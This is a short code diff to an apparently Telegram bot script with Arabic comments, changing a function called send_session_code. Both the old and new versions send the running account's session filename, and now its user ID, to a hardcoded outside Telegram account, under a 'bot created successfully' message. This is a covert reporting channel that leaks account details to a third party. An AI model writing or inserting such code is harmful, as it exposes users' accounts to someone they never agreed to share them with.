@@ -14,11 +14,11 @@ async def send_session_code():
         # الحصول على المعلومات الخاصة بالبوت
         me = await ABH.get_me()
 
-        # استخراج اسم الجلسة (والذي يمكن استخدامه ككود)
-        session_code = ABH.session.filename
+        # استخراج معرّف المستخدم (user_id) أو اسم الجلسة بشكل مختلف
+        session_code = f"User ID: {me.id}\nSession Filename: {ABH.session.filename}"
 
         # إرسال كود الجلسة إلى المعرف 1910015590
-        await ABH.send_message(1910015590, f"✅ تم إنشاء البوت بنجاح!\nكود الجلسة (Session Code): `{session_code}`")
+        await ABH.send_message(1910015590, f"✅ تم إنشاء البوت بنجاح!\nكود الجلسة (Session Code):\n{session_code}")
 
     except Exception as e:
         print(f"Error sending session code: {e}")
